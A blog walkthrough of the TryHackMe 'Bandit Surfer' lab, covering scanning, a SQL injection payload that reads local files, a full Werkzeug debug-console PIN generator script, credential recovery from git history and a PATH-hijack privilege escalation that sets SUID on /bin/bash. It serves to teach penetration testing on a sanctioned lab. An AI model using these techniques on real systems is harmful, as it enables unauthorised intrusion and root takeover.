---
title: "TryHackMe | The Bandit Surfer"
layout: post
date: 2023-12-30 16:00
tag: 
- TryHackMe
- Pentesting
- Advent of Cyber 23 Side Quest
- Linux
- Werkzeug
- SQLi
- Git
image: https://tryhackme-images.s3.amazonaws.com/room-icons/e310861391910e9ce100305a9130f5a6.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "A meduim TryHackMe box, with basic web enumeration and API fuzzing."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

The Bandit Surfer is the last challenge in the **Advent of Cyber 2023 Side Quest** which is a series of four connected challenges. These challenges have no additional guidance and range between "Hard" and "Insane" difficulty levels.

---

# Nmap

```bash
nmap -A -T4 10.10.232.167   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 12:52 +01
Nmap scan report for 10.10.232.167
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:43:37:a0:ac:a6:22:57:53:00:6d:75:51:db:bc:a9 (RSA)
|   256 25:16:18:74:8c:06:55:16:7e:20:84:89:ae:90:9a:f6 (ECDSA)
|_  256 fc:0b:0f:e2:c0:00:bb:89:a1:8f:de:71:9d:ad:d1:63 (ED25519)
8000/tcp open  http-alt Werkzeug/3.0.0 Python/3.8.10
|_http-title: The BFG
|_http-server-header: Werkzeug/3.0.0 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.0 Python/3.8.10
|     Date: Thu, 28 Dec 2023 11:52:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.0 Python/3.8.10
|     Date: Thu, 28 Dec 2023 11:52:32 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1752
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>The BFG</title>
|     <style>
|     Reset margins and paddings for the body and html elements */
|     html, body {
|     margin: 0;
|     padding: 0;
|     body {
|     background-image: url('static/imgs/snow.gif');
|     background-size: cover; /* Adjust the background size */
|     background-position: center top; /* Center the background image vertically and horizontally */
|     display: flex;
|     flex-direction: column;
|     justify-content: center;
|_    align-items: center;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=12/28%Time=658D617F%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,787,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.0
SF:\x20Python/3\.8\.10\r\nDate:\x20Thu,\x2028\x20Dec\x202023\x2011:52:32\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x201752\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20l
SF:ang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\
SF:x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
SF:x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>The\x20BFG</title>\n\x
SF:20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20/\*\x20Reset\x20
SF:margins\x20and\x20paddings\x20for\x20the\x20body\x20and\x20html\x20elem
SF:ents\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20html,\x20body\x20{\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20background-image:\x20url\('static/img
SF:s/snow\.gif'\);\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgr
SF:ound-size:\x20cover;\x20/\*\x20Adjust\x20the\x20background\x20size\x20\
SF:*/\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-position
SF::\x20center\x20top;\x20/\*\x20Center\x20the\x20background\x20image\x20v
SF:ertically\x20and\x20horizontally\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20display:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20flex-direction:\x20column;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20justify-content:\x20center;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20align-items:\x20center;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20
SF:NOT\x20FOUND\r\nServer:\x20Werkzeug/3\.0\.0\x20Python/3\.8\.10\r\nDate:
SF:\x20Thu,\x2028\x20Dec\x202023\x2011:52:38\x20GMT\r\nContent-Type:\x20te
SF:xt/html;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20c
SF:lose\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x2
SF:0Found</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20wa
SF:s\x20not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20t
SF:he\x20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20
SF:try\x20again\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
 
From the nmap output we can see that only two ports are open (22 & 8000). The port 80 is running the Werkzeug Python service, let's check it :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228125818.png>)

Just a normal web page that holds three pictures to download, let's run Gobuster :

# Gobuster

```bash
gobuster dir -u http://10.10.232.167:8000 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.232.167:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 200) [Size: 1563]
/download             (Status: 200) [Size: 20]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Checking the */console* endpoint, we see that we're unauthorized to access it unless we have a PIN :
 
![Alt text](<../../../assets/images/THMPics/Pasted image 20231228130606.png>)

And the */download* endpoint lets us to download one of the pictures above, by selecting its id, so the first thing I thought about was trying to enter an invalid id to see the application's behavior. In the source code we can see that only the ids from 1 to 3 are valid, what if we enter 0 for exemple :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228130707.png>)

Huh! it's a flask TypeError. I tought about LFI but it was a dead end!

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228130624.png>)

Then I said let's give a try to SQLi :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228151834.png>)

I got an  error, that's a good hint! To automate the process I used **SQLMap** :

```bash
sqlmap -u "http://10.10.203.181:8000/download?id=" --dbs
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228152031.png>)

After playing around the database, nothing useful found, so I went to do it manually. I said let's try to read local files suing the UNION SELECT query, and it worked :

```bash
'+UNION+SELECT+"file:///etc/passwd"+--+-
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228152548.png>)

So now I can read local files to combine the recipes that I need to generate the PIN, the blogs bellow show how to do that, so I'll what I have to do is to follow them :

[https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting)

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)

- First I need to find the server MAC address :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228153627.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228155821.png>)

- Then I need to convert it from hex to decimal :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228155729.png>)

- And the last thing is the machine id :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228154047.png>)

Now my script is ready, I can get the PIN just by executing it :

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'mcskidy',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name**'))
    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2838560867849',# str(uuid.getnode()),  /sys/class/net/eth0/address
    'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

BOOM I successfully got the PIN :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228155958.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228155945.png>)

# User flag

Now I can enter the */console* endpoint and run commands :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228160208.png>)

I got a shell as *mcskidy* user :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228160430.png>)

# PE

In the */home/mcskidy/app* directory I found the .git folder so I thought about using GitTools to extract some hidden commits, maybe that can contain some useful info :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228164310.png>)

First I run a python server in the */app* folder, and used gitdumper do dump the content of the .git folder :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240101193642.png>)

```bash
./gitdumper.sh http://10.10.105.8:6666/.git/ repo
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228164345.png>)

```bash
git log
```

I saw an interesting commit "Change MySQL user", that can contain some credentials :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228163104.png>)

And yes I found the MySQL credentials of both the root & mcskidy user :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228163134.png>)

The mcskidy MySQL password above is being reused as the password of the user. Let's see what I can do as root :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240101193826.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228161610.png>)

`[` is actually a command, equivalent to the `test` command.

![Alt text](<../../../assets/images/THMPics/Pasted image 20240101195731.png>)

What I thought of is to create a binary named `[` and put there a reverse shell or something, and the file will be executed by root while using the if comparison :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240101184840.png>)

So now I can create my file in */home/mcskidy* as specified in the secure_path, that will add a SUID bit to */bin/bash* after executing :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228164502.png>)

After running the *check.sh* bash file we can see that we have successfully added a suid bit to */bin/bash*. and voilà I'm root!

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228163737.png>)

Now I can read the root flag :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231228163811.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>